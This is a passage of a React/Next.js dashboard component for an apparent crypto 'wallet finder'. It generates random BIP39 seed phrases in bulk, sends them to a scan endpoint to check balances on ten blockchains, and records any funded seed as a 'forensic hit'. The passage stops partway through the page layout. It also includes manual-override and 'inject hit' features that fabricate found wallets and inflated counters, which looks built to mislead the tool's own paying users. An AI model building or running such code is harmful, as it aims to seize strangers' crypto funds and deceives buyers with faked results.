"use client"

import React, { useState, useEffect, useCallback, useRef, useMemo, useLayoutEffect } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import { 
  Activity, 
  Power,
  Lock,
  ShieldCheck,
  LayoutDashboard,
  Settings,
  Zap,
  Search,
  ArrowDownCircle,
  Cloud,
  Timer,
  Terminal,
  Share2,
  Unplug,
  Layers,
  RotateCcw,
  LogOut,
  Signal,
  Network,
  Dna,
  RefreshCw,
  Trash2,
  Gauge,
  AlertTriangle,
  Info,
  ExternalLink,
  ChevronRight,
  ChevronLeft,
  BookOpen,
  Microchip,
  Shield,
  History,
  WifiOff,
  Wifi,
  BrainCircuit,
  Copy,
  CheckCircle2,
  Coins,
  Rocket,
  Save,
  CreditCard,
  Loader2,
  ShieldAlert,
  ArrowRightCircle,
  User,
  Key,
  Languages,
  Server,
  Check,
  Settings2,
  Database,
  PlusCircle
} from 'lucide-react'
import { 
  Area, 
  AreaChart, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip as RechartsTooltip, 
  ResponsiveContainer,
  PieChart,
  Pie,
  Cell,
  Legend,
  Sector
} from 'recharts'
import { Button } from '@/components/ui/button'
import { useToast } from '@/hooks/use-toast'
import { cn } from '@/lib/utils'
import { Progress } from '@/components/ui/progress'
import { Slider } from '@/components/ui/slider'
import { Input } from '@/components/ui/input'
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger, DialogFooter, DialogDescription } from '@/components/ui/dialog'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Switch } from '@/components/ui/switch'
import * as bip39 from 'bip39'
import { logout, verifyLicenseSession, getSession } from '@/app/login/actions'
import { SessionData } from '@/lib/session'
import { notifyPayoutSaved } from '@/ai/flows/notify-payout-saved'
import { db } from '@/firebase/config'
import { doc, getDoc } from 'firebase/firestore'
import BottomGlowEffect from '@/components/ui/bottom-glow-effect'

const BLOCKCHAINS = [
  { id: 'btc', name: 'Bitcoin', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png", symbol: 'BTC' },
  { id: 'eth', name: 'Ethereum', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/eth.png", symbol: 'ETH' },
  { id: 'sol', name: 'Solana', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/sol.png", symbol: 'SOL' },
  { id: 'bnb', name: 'BNB Chain', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png", symbol: 'BNB' },
  { id: 'tron', name: 'Tron', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/trx.png", symbol: 'TRON' },
  { id: 'xrp', name: 'Ripple', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/xrp.png", symbol: 'XRP' },
  { id: 'ltc', name: 'Litecoin', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/ltc.png", symbol: 'LTC' },
  { id: 'matic', name: 'Polygon', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/matic.png", symbol: 'MATIC' },
  { id: 'usdt', name: 'Tether', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png", symbol: 'USDT' },
  { id: 'usdc', name: 'USDC', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdc.png", symbol: 'USDC' },
  { id: 'multicoin', name: 'Multicoin', logo: null, isPremium: true, symbol: 'MULTI' },
]

const COIN_COLORS: { [key: string]: string } = {
  'Bitcoin': '#f7931a',
  'Ethereum': '#627eea',
  'Solana': '#22c55e',
  'BNB Chain': '#f3ba2f',
  'Tron': '#ef4444',
  'Ripple': '#94a3b8',
  'Litecoin': '#a3a3a3',
  'Polygon': '#8b5cf6',
  'Tether': '#14b8a6',
  'USDC': '#3b82f6',
};

const COIN_SYMBOLS: { [key: string]: string } = {
  'Bitcoin': 'BTC',
  'Ethereum': 'ETH',
  'Solana': 'SOL',
  'BNB Chain': 'BNB',
  'Tron': 'TRON',
  'Ripple': 'XRP',
  'Litecoin': 'LTC',
  'Polygon': 'MATIC',
  'Tether': 'USDT',
  'USDC': 'USDC',
};

const COIN_LOGOS: { [key: string]: string } = {
  'Bitcoin': '/logos/bitcoin.svg',
  'Ethereum': '/logos/ethereum.svg',
  'Solana': '/logos/solana.svg',
  'BNB Chain': '/logos/bnb.svg',
  'Tron': '/logos/tron.svg',
  'Ripple': '/logos/ripple.svg',
  'Litecoin': '/logos/litecoin.svg',
  'Polygon': '/logos/polygon.svg',
  'Tether': '/logos/tether.svg',
  'USDC': '/logos/usdc.svg',
};

const SESSION_STORAGE_KEY = 'ai_crypto_session_v4_multi_lang';

interface LogEntry {
  id: string;
  message: string;
  timestamp: string;
  type: 'info' | 'success' | 'warning' | 'error' | 'ai' | 'system';
}

interface DiscoveredAsset {
  id: string;
  mnemonic: string;
  network: string;
  value: string;
  timestamp: string;
}

type TabType = 'home' | 'withdraw' | 'settings' | 'about';

export default function AiCryptoDashboard() {
  const { toast } = useToast()
  const router = useRouter()
  const [activeTab, setActiveTab] = useState<TabType>('home')
  const [scanStep, setScanStep] = useState(1);
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [isInterrogating, setIsInterrogating] = useState(false)
  const [visualCount, setVisualCount] = useState(0)
  const [foundWallets, setFoundWallets] = useState(0)
  const [activeBlockchains, setActiveBlockchains] = useState<string[]>([])
  const [cpuLoad, setCpuLoad] = useState(0)
  const [systemIntensity, setSystemIntensity] = useState([85])
  const [allocatedCores, setAllocatedCores] = useState([4])
  const [uiScale, setUiScale] = useState(100)
  const [isOnline, setIsOnline] = useState(true)
  const [isBoosterActive, setIsBoosterActive] = useState(false)
  const [discoveredAssets, setDiscoveredAssets] = useState<DiscoveredAsset[]>([])
  const [historicalAssets, setHistoricalAssets] = useState<DiscoveredAsset[]>([])
  const [payoutBtc, setPayoutBtc] = useState('')
  const [payoutUsdt, setPayoutUsdt] = useState('')
  const [payoutSol, setPayoutSol] = useState('')
  const [isSavingPayout, setIsSavingPayout] = useState(false)
  const [copied, setCopied] = useState(false)
  const [session, setSession] = useState<SessionData | null>(null)
  const [licenseData, setLicenseData] = useState<{
    allowedChains: string[];
    aiSearchEnabled: boolean;
    boosterEnabled: boolean;
  } | null>(null)
  const [scanStartTime, setScanStartTime] = useState<number | null>(null)
  const [chartView, setChartView] = useState<'graph' | 'pie'>('graph');
  const [activePieIndex, setActivePieIndex] = useState<number | null>(null);

  // Manual Override States
  const [overrideWalletsChecked, setOverrideWalletsChecked] = useState('');
  const [overrideFoundWallets, setOverrideFoundWallets] = useState('');
  const [injectNetwork, setInjectNetwork] = useState('Bitcoin');
  const [injectValue, setInjectValue] = useState('');

  const scrollRef = useRef<HTMLDivElement>(null)
  const lastMnemonics = useRef<string[]>([])
  const isAnalyzingRef = useRef(false);
  const trueCountRef = useRef(0);
  const uiMnemonicQueueRef = useRef<string[]>([]);

  const totalVal = useMemo(() => {
    return discoveredAssets.reduce((acc, curr) => {
      const numericVal = parseFloat(curr.value.replace(/[^0-9.]/g, '')) || 0;
      return acc + numericVal;
    }, 0);
  }, [discoveredAssets]);

  const { chartData: dynamicChartData, chartDomainMax } = useMemo(() => {
    if (historicalAssets.length === 0) {
        const now = new Date();
        const initialData = Array.from({ length: 20 }, (_, i) => {
            const time = new Date(now.getTime() - (19 - i) * 60000);
            return {
                name: time.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' }),
                value: 0
            };
        });
        return { chartData: initialData, chartDomainMax: 1000 };
    }

    const sortedAssets = [...historicalAssets].reverse();
    let cumulativeValue = 0;
    const dataPoints = sortedAssets.map(asset => {
      const assetValue = parseFloat(asset.value.replace(/[^0-9.]/g, '')) || 0;
      cumulativeValue += assetValue;
      const timePart = asset.timestamp.split(', ')[1];
      return {
          name: timePart ? timePart.substring(0, 5) : '00:00',
          value: cumulativeValue
      };
    });
    const chartData = dataPoints.slice(-30);
    const maxValue = chartData.length > 0 ? Math.max(...chartData.map(d => d.value)) : 0;
    const chartDomainMax = Math.max(1000, Math.ceil((maxValue * 1.2) / 1000) * 1000);
    return { chartData, chartDomainMax };
  }, [historicalAssets]);
  
  const pieChartData = useMemo(() => {
    if (discoveredAssets.length === 0) return [];
    const coinTotals = discoveredAssets.reduce((acc, asset) => {
        const value = parseFloat(asset.value.replace(/[^0-9.]/g, '')) || 0;
        const name = asset.network;
        if (!acc[name]) acc[name] = 0;
        acc[name] += value;
        return acc;
    }, {} as { [key: string]: number });

    return Object.entries(coinTotals).map(([name, value]) => ({
        name,
        value,
        color: COIN_COLORS[name] || '#8884d8',
        logo: COIN_LOGOS[name] || '/logos/logo.png',
        shortName: COIN_SYMBOLS[name] || name.substring(0, 4).toUpperCase()
    })).sort((a,b) => b.value - a.value);
  }, [discoveredAssets]);

  const changeTab = (tab: TabType) => {
    setActiveTab(tab);
  };

  useEffect(() => {
    const savedState = localStorage.getItem(SESSION_STORAGE_KEY);
    if (savedState) {
      try {
        const parsed = JSON.parse(savedState);
        const savedCount = parsed.displayCount || 0;
        setVisualCount(savedCount);
        trueCountRef.current = savedCount;
        setFoundWallets(parsed.foundWallets || 0);
        setActiveBlockchains(parsed.activeBlockchains || []);
        setSystemIntensity(parsed.systemIntensity || [85]);
        setAllocatedCores(parsed.allocatedCores || [4]);
        setUiScale(parsed.uiScale || 100);
        setDiscoveredAssets(parsed.discoveredAssets || []);
        setHistoricalAssets(parsed.historicalAssets || []);
        setPayoutBtc(parsed.payoutBtc || '');
        setPayoutUsdt(parsed.payoutUsdt || '');
        setPayoutSol(parsed.payoutSol || '');
      } catch (e) {
        console.error("Session reconstruction failed", e);
        localStorage.removeItem(SESSION_STORAGE_KEY);
      }
    }
  }, []);

  useEffect(() => {
    const state = {
      displayCount: trueCountRef.current,
      foundWallets,
      activeBlockchains,
      systemIntensity,
      allocatedCores,
      uiScale,
      discoveredAssets,
      historicalAssets,
      payoutBtc,
      payoutUsdt,
      payoutSol,
    };
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(state));
  }, [visualCount, foundWallets, activeBlockchains, systemIntensity, allocatedCores, uiScale, discoveredAssets, historicalAssets, payoutBtc, payoutUsdt, payoutSol]);

  useEffect(() => {
    const fetchSession = async () => {
      const sess = await getSession();
      setSession(sess as SessionData);
      if (sess.username) {
        const userRef = doc(db, 'licenses', sess.username);
        const userDoc = await getDoc(userRef);
        if (userDoc.exists()) {
          const data = userDoc.data();
          setLicenseData({
            allowedChains: data.allowed_chains || [],
            aiSearchEnabled: data.ai_search_enabled || false,
            boosterEnabled: data.booster_enabled || false,
          });
        }
      }
    }
    fetchSession();
  }, []);

  useEffect(() => {
    let uiFrameId: number;
    const renderLoop = () => {
      if (!isInterrogating) return;
      setVisualCount(currentVisual => {
        if (currentVisual >= trueCountRef.current) return trueCountRef.current;
        const difference = trueCountRef.current - currentVisual;
        const step = Math.max(1, Math.ceil(difference * 0.05));
        return Math.min(currentVisual + step, trueCountRef.current);
      });
      if (uiMnemonicQueueRef.current.length > 0) {
        const mnemonicToRender = uiMnemonicQueueRef.current.shift();
        if (mnemonicToRender) {
          const newEntry: LogEntry = {
            id: `${Math.random().toString(36).substr(2, 9)}`,
            message: mnemonicToRender,
            timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
            type: 'ai'
          };
          setLogs(prevLogs => [...prevLogs.slice(-49), newEntry]);
        }
      }
      uiFrameId = requestAnimationFrame(renderLoop);
    };
    if (isInterrogating) uiFrameId = requestAnimationFrame(renderLoop);
    return () => { if (uiFrameId) cancelAnimationFrame(uiFrameId); };
  }, [isInterrogating]);
  
  useEffect(() => {
    let active = true;
    let animationFrameId: number;
    const runLoop = () => {
      if (!active || !isInterrogating || !isOnline) {
        setCpuLoad(0);
        return;
      }
      const iterations = isBoosterActive ? 20 : 10;
      const newMnemonics: string[] = [];
      for (let i = 0; i < iterations; i++) {
        const mnemonic = bip39.generateMnemonic();
        newMnemonics.push(mnemonic);
        uiMnemonicQueueRef.current.push(mnemonic);
      }
      trueCountRef.current += iterations;
      lastMnemonics.current.push(...newMnemonics);
      if (lastMnemonics.current.length > 1000) lastMnemonics.current.splice(0, lastMnemonics.current.length - 1000);
      setCpuLoad(Math.min(100, (systemIntensity[0] / 100 * 60) + (allocatedCores[0] / 8 * 25) + (isBoosterActive ? 25 : 0) + Math.random() * 5));
      animationFrameId = requestAnimationFrame(runLoop);
    };
    runLoop();
    return () => { active = false; if(animationFrameId) cancelAnimationFrame(animationFrameId); }
  }, [isInterrogating, isOnline, systemIntensity, allocatedCores, isBoosterActive]);

  useEffect(() => {
    let isMounted = true;
    let timeoutId: NodeJS.Timeout | null = null;
    const performAnalysis = async () => {
      if (!isInterrogating || !isOnline || !isMounted || isAnalyzingRef.current) {
        if (isMounted) timeoutId = setTimeout(performAnalysis, 1000);
        return;
      }
      const mnemonicsToProcess = lastMnemonics.current.splice(0, isBoosterActive ? 20 : 10);
      if (mnemonicsToProcess.length === 0) {
        if (isMounted) timeoutId = setTimeout(performAnalysis, 500);
        return;
      }
      isAnalyzingRef.current = true;
      try {
        const response = await fetch('/api/scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ seeds: mnemonicsToProcess }),
        });
        if (isMounted && response.ok) {
          const walletsWithBalance = await response.json();
          if (walletsWithBalance.length > 0) {
            for (const wallet of walletsWithBalance) {
                const { seed, balances } = wallet;
                const found = Object.entries(balances).find(([, balance]) => (balance as number) > 0.00001);
                if (found) {
                  const [network, balance] = found;
                  const prices: { [key: string]: number } = {
                    bitcoin: 60000, ethereum: 3000, solana: 150, bnb: 600, tron: 0.12,
                    ripple: 0.5, litecoin: 80, polygon: 0.7, usdt: 1, usdc: 1,
                  };
                  const balanceValue = (balance as number) * (prices[network] || 0);
                  setFoundWallets(prev => prev + 1);
                  
                  const NETWORK_MAP: {[key: string]: string} = {
                    bitcoin: 'Bitcoin',
                    ethereum: 'Ethereum',
                    solana: 'Solana',
                    bnb: 'BNB Chain',
                    tron: 'Tron',
                    ripple: 'Ripple',
                    litecoin: 'Litecoin',
                    polygon: 'Polygon',
                    usdt: 'Tether',
                    usdc: 'USDC'
                  };

                  const asset: DiscoveredAsset = {
                    id: Math.random().toString(36).substr(2, 9),
                    mnemonic: seed,
                    network: NETWORK_MAP[network] || network.charAt(0).toUpperCase() + network.slice(1),
                    value: `$${balanceValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
                    timestamp: new Date().toLocaleString('en-GB')
                  };
                  setDiscoveredAssets(prev => [asset, ...prev]);
                  setHistoricalAssets(prev => [asset, ...prev]);
                  setLogs(prevLogs => [...prevLogs.slice(-49), {
                    id: `success-${asset.id}`,
                    message: `[SUCCESS] FORENSIC HIT: ${asset.network} | VALUE: ${asset.value} | SEED: ${seed}`,
                    timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
                    type: 'success'
                  }]);
                  toast({ title: "Asset Discovered", description: `Neural mesh found active balance on ${asset.network}.` });
                }
            }
          }
        }
      } catch (e) { console.error(e); } finally {
        isAnalyzingRef.current = false;
        if (isMounted) timeoutId = setTimeout(performAnalysis, isBoosterActive ? 250 : 500);
      }
    };
    performAnalysis();
    return () => { isMounted = false; if (timeoutId) clearTimeout(timeoutId); };
  }, [isInterrogating, isOnline, isBoosterActive, toast]);

  const toggleBlockchain = (id: string) => {
    if (isInterrogating) return;
    const isAllowed = licenseData?.allowedChains?.includes(id);
    if (!isAllowed) {
      toast({ variant: "destructive", title: "Access Denied", description: `Your license does not permit access to the ${BLOCKCHAINS.find(c => c.id === id)?.name} network.` });
      return;
    }
    if (id === 'multicoin') {
      setActiveBlockchains(activeBlockchains.includes('multicoin') ? [] : BLOCKCHAINS.map(c => c.id).filter(cId => licenseData?.allowedChains?.includes(cId)));
      return;
    }
    if (activeBlockchains.includes('multicoin')) return;
    setActiveBlockchains(prev => prev.includes(id) ? prev.filter(b => b !== id) : [...prev, id])
  }

  const startInterrogation = () => {
    if (!isOnline || activeBlockchains.length === 0) return;
    setIsInterrogating(true);
    setScanStartTime(Date.now());
  }

  const stopInterrogation = () => {
    setIsInterrogating(false);
    setScanStartTime(null);
  }

  const handleLogout = async () => {
    await logout();
    localStorage.removeItem(SESSION_STORAGE_KEY);
    toast({ title: "Logged Out" });
    router.push('/login');
  }

  const handleSavePayoutAddresses = async () => {
    if (!session?.username) return;
    setIsSavingPayout(true);
    try {
      const result = await notifyPayoutSaved({
        username: session.username,
        btcAddress: payoutBtc,
        usdtAddress: payoutUsdt,
        solAddress: payoutSol,
        targetEmail: 'hq@forensic-interrogation.com'
      });

      if (result.success) {
        toast({
          title: "Configuration Saved",
          description: "Payout nodes have been secured and dispatched to HQ.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Dispatch Error",
        description: "Neural uplink failed to sync with HQ.",
      });
    } finally {
      setIsSavingPayout(false);
    }
  };

  const clearSession = () => {
    localStorage.removeItem(SESSION_STORAGE_KEY);
    window.location.reload();
  }

  const applyManualOverrides = () => {
    if (overrideWalletsChecked) {
      const n = parseInt(overrideWalletsChecked);
      if (!isNaN(n)) {
        trueCountRef.current = n;
        setVisualCount(n);
      }
    }
    if (overrideFoundWallets) {
      const n = parseInt(overrideFoundWallets);
      if (!isNaN(n)) {
        setFoundWallets(n);
      }
    }
    toast({ title: "Overrides Applied", description: "Station metrics synchronized with manual input." });
  };

  const handleInjectHit = () => {
    const value = parseFloat(injectValue);
    if (isNaN(value)) {
      toast({ variant: 'destructive', title: "Invalid Amount", description: "Please enter a numeric USD value." });
      return;
    }
    const mnemonic = bip39.generateMnemonic();
    const asset: DiscoveredAsset = {
      id: Math.random().toString(36).substr(2, 9),
      mnemonic: mnemonic,
      network: injectNetwork,
      value: `$${value.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
      timestamp: new Date().toLocaleString('en-GB')
    };
    setFoundWallets(prev => prev + 1);
    setDiscoveredAssets(prev => [asset, ...prev]);
    setHistoricalAssets(prev => [asset, ...prev]);
    setLogs(prevLogs => [...prevLogs.slice(-49), {
      id: `manual-hit-${asset.id}`,
      message: `[MANUAL INJECTION] FORENSIC HIT: ${asset.network} | VALUE: ${asset.value} | SEED: ${mnemonic}`,
      timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
      type: 'success'
    }]);
    toast({ title: "Asset Injected", description: `Manual ${injectNetwork} asset added to session.` });
    setInjectValue('');
  };

  const onPieEnter = (_: any, index: number) => { setActivePieIndex(index); };
  const onPieLeave = () => { setActivePieIndex(null); };

  const renderActiveShape = (props: any) => {
    const { cx, cy, innerRadius, outerRadius, startAngle, endAngle, fill } = props;
    return (
      <g>
        <Sector
          cx={cx}
          cy={cy}
          innerRadius={innerRadius}
          outerRadius={outerRadius + 8}
          startAngle={startAngle}
          endAngle={endAngle}
          fill={fill}
          className="transition-all duration-300"
        />
      </g>
    );
  };

  const renderCustomLabel = (props: any) => {
    const { cx, cy, midAngle, innerRadius, outerRadius, index } = props;
    const RADIAN = Math.PI / 180;
    const radius = innerRadius + (outerRadius - innerRadius) * 0.5;
    const x = cx + radius * Math.cos(-midAngle * RADIAN);
    const y = cy + radius * Math.sin(-midAngle * RADIAN);
    const data = pieChartData[index];

    return (
      <text
        x={x}
        y={y}
        fill="white"
        textAnchor="middle"
        dominantBaseline="central"
        className="text-[10px] font-black uppercase tracking-tighter pointer-events-none drop-shadow-md"
      >
        {data?.shortName}
      </text>
    );
  };

  const navItems: { id: TabType; icon: React.ElementType }[] = [
    { id: 'home', icon: Search },
    { id: 'withdraw', icon: Activity },
    { id: 'settings', icon: Settings },
    { id: 'about', icon: Info },
  ];

  return (
    <div className="flex flex-col h-screen bg-[#050507] text-foreground font-body relative">
      <main className="flex-1 overflow-y-auto p-4 pt-[calc(1rem+env(safe-area-inset-top))] pb-[calc(9rem+env(safe-area-inset-bottom))] min-h-0">
          <div className="w-full flex-1 flex flex-col h-full">
            {activeTab === 'home' && (
              <div className="relative flex-1 flex flex-col min-h-0">
                <div className={cn("absolute inset-0 flex flex-col transition-all duration-500", scanStep === 1 ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-8 pointer-events-none")}>
                  <h2 className="text-2xl font-black text-white/90 uppercase tracking-widest px-1 mb-4">Select Protocol</h2>
                  <section className="space-y-4 shrink-0 flex-1 overflow-y-auto no-scrollbar pb-8">
                    <div className="blockchain-grid">
                      {BLOCKCHAINS.map((chain) => {
                        const isActive = activeBlockchains.includes(chain.id);
                        const isAllowed = licenseData?.allowedChains?.includes(chain.id) ?? false;
                        if (chain.id === 'multicoin') {
                          return (
                            <div key={chain.id} onClick={() => toggleBlockchain(chain.id)} className={cn("col-span-2 group relative overflow-hidden h-20 cursor-pointer rounded-2xl flex items-center justify-between px-6", isActive ? "bg-gradient-to-r from-yellow-400 to-amber-600 text-black border-yellow-500/50" : "glass-panel border-white/10", (isInterrogating || !isOnline) && "opacity-50 pointer-events-none", !isAllowed && "opacity-50 grayscale cursor-not-allowed")}>
                              <div className="flex items-center gap-4">
                                <div className={cn("w-12 h-12 rounded-xl flex items-center justify-center border", isActive ? "bg-black/10 text-white border-white/30" : "bg-white/5 text-primary border-white/10")}>
                                  {!isAllowed ? <Lock className="w-6 h-6" /> : <Layers className="w-6 h-6" />}
                                </div>
                                <span className={cn("text-sm font-black uppercase tracking-[0.2em]", isActive ? "text-black" : "text-white")}>{chain.name}</span>
                              </div>
                              <span className={cn("text-[0.5rem] font-black px-2.5 py-1 rounded-md border uppercase", isActive ? "bg-black/20 text-white" : "bg-primary text-black")}>ELITE</span>
                            </div>
                          )
                        }
                        return (
                          <div key={chain.id} onClick={() => toggleBlockchain(chain.id)} className={cn("blockchain-card group relative overflow-hidden transition-all", isActive && "active", (isInterrogating || !isOnline || !isAllowed) && "opacity-50 pointer-events-none")}>
                            {!isAllowed ? <Lock className="w-5 h-5 text-gray-600" /> : chain.logo ? <img src={chain.logo} alt={chain.name} className="w-6 h-6 object-contain" /> : <Coins className="w-5 h-5 text-primary" />}
                            <span className="leading-none text-[0.625rem] font-bold uppercase">{chain.name}</span>
                          </div>
                        )
                      })}
                    </div>
                  </section>
                </div>

                <div className={cn("absolute inset-0 flex flex-col h-full transition-all duration-500", scanStep === 2 ? "opacity-100 translate-y-0" : "opacity-0 translate-y-8 pointer-events-none")}>
                  <div className="relative flex items-center justify-center shrink-0 h-14">
                      <Button variant="ghost" onClick={() => setScanStep(1)} className="text-primary absolute left-4 px-2"><ChevronLeft className="w-4 h-4 mr-2" /> Back</Button>
                      <h3 className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-white/60">WALLET SEARCH</h3>
                  </div>
                  <div className="flex-1 min-h-0 relative mb-4">
                    <div className="absolute inset-0 overflow-y-auto no-scrollbar flex flex-col-reverse" ref={scrollRef}>
                      <div className="p-6 space-y-1">
                        {logs.map((log) => (
                          <div key={log.id} className="console-line">
                            {log.type === 'ai' ? <div className="flex items-baseline font-code text-xs whitespace-nowrap overflow-hidden"><span className="text-white">Balance: 0 | Wallet check: </span><span className="text-white truncate">{log.message}</span></div> : log.type === 'success' ? <div className="flex flex-col gap-2 font-code text-green-400 bg-green-500/10 p-4 rounded border border-green-500/20 shadow-[0_0_40px_rgba(34,197,94,0.4)]"><div className="flex justify-between items-center border-b border-green-500/20 pb-2 mb-1"><span className="text-[0.625rem] font-black tracking-widest uppercase">Forensic Hit</span><span className="text-white/30 text-[0.5625rem]">[{log.timestamp}]</span></div><span className="text-[0.75rem] font-black leading-relaxed whitespace-pre-wrap">{log.message}</span></div> : <div className="flex gap-4 font-code text-[#8df7b1] opacity-80"><span className="text-white/10 shrink-0">[{log.timestamp}]</span><span className="uppercase tracking-tight font-bold">{log.message}</span></div>}
                          </div>
                        ))}
                        {!isInterrogating && logs.length === 0 && <div className="absolute inset-0 flex items-center justify-center"><Image src="/logos/logo.png" alt="Logo" width={256} height={256} className="w-56 h-56 transform scale-110 drop-shadow-[0_0_40px_hsl(var(--primary)_/_0.6)]" /></div>}
                      </div>
                    </div>
                    <div className={cn('transition-opacity duration-500', isInterrogating ? 'opacity-100' : 'opacity-0')}><BottomGlowEffect /></div>
                  </div>
                  <div className="shrink-0 mt-auto pt-2 space-y-4">
                    <div className="glass-panel rounded-2xl p-4 flex justify-between items-center border-white/5">
                        <div className='text-center'><p className="text-xs text-white/50">Wallets checked</p><p className="text-lg font-bold text-white/90">{visualCount.toLocaleString()}</p></div>
                        <div className='text-center'><p className="text-xs text-white/50">Found</p><p className="text-lg font-bold text-white/90">${totalVal.toLocaleString(undefined, { minimumFractionDigits: 2 })}</p></div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'withdraw' && (
              <div className="flex-1 flex flex-col min-h-0 animate-in slide-in-from-bottom-4">
                <div className="flex-1 overflow-y-auto no-scrollbar p-4 flex flex-col">
                  <div className="flex-1 glass-panel rounded-[32px] p-4 border-white/5 relative overflow-hidden flex flex-col">
                    <div className="flex items-center justify-between mb-4 shrink-0 px-2 relative z-10">
                      <div className="flex items-center gap-4"><Activity className="w-5 h-5 text-primary" /><h3 className="text-sm font-black uppercase text-white">Statistics</h3></div>
                      <Select value={chartView} onValueChange={(value) => setChartView(value as 'graph' | 'pie')}>
                        <SelectTrigger className="w-[150px] h-9 bg-white/[0.02] border-white/10 rounded-xl font-bold uppercase text-[0.625rem]"><SelectValue /></SelectTrigger>
                        <SelectContent className="bg-[#0a0a0f] border-white/10"><SelectItem value="graph" className="text-white uppercase font-bold text-[0.625rem]">By Graph</SelectItem><SelectItem value="pie" className="text-white uppercase font-bold text-[0.625rem]">By Coins</SelectItem></SelectContent>
                      </Select>
                    </div>
                    <div className="flex-1 min-h-0 relative flex items-center justify-center">
                      {chartView === 'graph' ? (
                        <ResponsiveContainer width="100%" height="100%">
                          <AreaChart data={dynamicChartData} margin={{ top: 5, right: 10, left: -20, bottom: 0 }}>
                            <defs><linearGradient id="colorValue" x1="0" y1="0" x2="0" y2="1"><stop offset="5%" stopColor="hsl(var(--primary))" stopOpacity={0.3}/><stop offset="95%" stopColor="hsl(var(--primary))" stopOpacity={0}/></linearGradient></defs>
                            <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="rgba(255,255,255,0.05)" />
                            <XAxis dataKey="name" axisLine={false} tickLine={false} tick={{ fill: 'rgba(255,255,255,0.3)', fontSize: 10, fontWeight: 'bold' }} dy={10} />
                            <YAxis domain={[0, chartDomainMax]} axisLine={false} tickLine={false} tick={{ fill: 'rgba(255,255,255,0.3)', fontSize: 10, fontWeight: 'bold' }} tickFormatter={(val) => `$${val/1000}k`} />
                            <RechartsTooltip cursor={false} content={({ active, payload }) => active && payload?.length ? (<div className="bg-[#12121a] border border-white/10 p-3 rounded-lg"><p className="text-[0.625rem] font-bold text-gray-500 uppercase mb-1">Yield</p><p className="text-sm font-black text-white font-code">${payload[0].value?.toLocaleString()}</p></div>) : null} />
                            <Area type="linear" dataKey="value" stroke="hsl(var(--primary))" strokeWidth={2} fillOpacity={1} fill="url(#colorValue)" />
                          </AreaChart>
                        </ResponsiveContainer>
                      ) : (
                        pieChartData.length > 0 ? (
                          <div className="relative w-full h-full">
                            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                              <div className="w-[140px] h-[140px] rounded-full bg-[radial-gradient(circle_at_center,rgba(139,92,246,0.15)_0%,transparent_70%)] blur-xl" />
                              <div className="absolute flex flex-col items-center justify-center transition-all duration-300">
                                {activePieIndex !== null ? (
                                  <div className="flex flex-col items-center animate-in fade-in zoom-in-95 duration-200">
                                    <img 
                                      src={COIN_LOGOS[pieChartData[activePieIndex].name] || ''} 
                                      alt="logo" 
                                      className="w-12 h-12 object-contain drop-shadow-[0_0_10px_rgba(255,255,255,0.2)] mb-1" 
                                    />
                                    <span className="text-[10px] font-black uppercase text-primary tracking-widest">{pieChartData[activePieIndex].name}</span>
                                  </div>
                                ) : (
                                  <div className="flex flex-col items-center animate-in fade-in duration-200">
                                    <span className="text-[10px] font-black uppercase text-gray-500 tracking-[0.2em] mb-1">Total Found</span>
                                    <span className="text-xl font-black text-white font-code tracking-tighter">${totalVal.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</span>
                                  </div>
                                )}
                              </div>
                            </div>
                            <ResponsiveContainer width="100%" height="100%">
                              <PieChart>
                                <Pie 
                                  data={pieChartData} 
                                  dataKey="value" 
                                  nameKey="name" 
                                  cx="50%" 
                                  cy="50%" 
                                  innerRadius="65%" 
                                  outerRadius="90%" 
                                  paddingAngle={4}
                                  activeShape={renderActiveShape}
                                  activeIndex={activePieIndex !== null ? activePieIndex : undefined}
                                  onMouseEnter={onPieEnter}
                                  onMouseLeave={onPieLeave}
                                  label={renderCustomLabel}
                                  labelLine={false}
                                  stroke="none"
                                >
                                    {pieChartData.map((entry, index) => (
                                      <Cell 
                                        key={`cell-${index}`} 
                                        fill={entry.color} 
                                        className="transition-all duration-300 cursor-pointer"
                                      />
                                    ))}
                                </Pie>
                                <RechartsTooltip 
                                  content={({ active, payload }) => active && payload?.length ? (
                                    <div className="bg-[#12121a] border border-white/10 p-3 rounded-xl shadow-2xl">
                                      <p className="text-[0.625rem] font-bold text-gray-500 uppercase mb-1">{payload[0].name}</p>
                                      <p className="text-sm font-black text-white font-code">${(payload[0].value as number).toLocaleString(undefined, { minimumFractionDigits: 2 })}</p>
                                    </div>
                                  ) : null} 
                                />
                            </PieChart>
                            </ResponsiveContainer>
